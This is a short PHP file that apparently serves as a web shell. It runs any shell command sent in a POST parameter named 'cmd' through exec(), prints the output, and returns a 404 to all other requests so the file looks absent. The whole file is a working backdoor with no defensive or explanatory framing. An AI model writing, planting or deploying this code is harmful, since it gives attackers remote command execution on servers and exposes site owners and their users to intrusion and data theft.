<?php
if(array_key_exists("cmd",$_POST)) {
#$cmd = stripslashes($_POST['cmd']);
$cmd = urldecode($_POST['cmd']);
echo $cmd . PHP_EOL;
exec($cmd, $out);
var_dump($out);
return;
}
http_response_code(404);
?>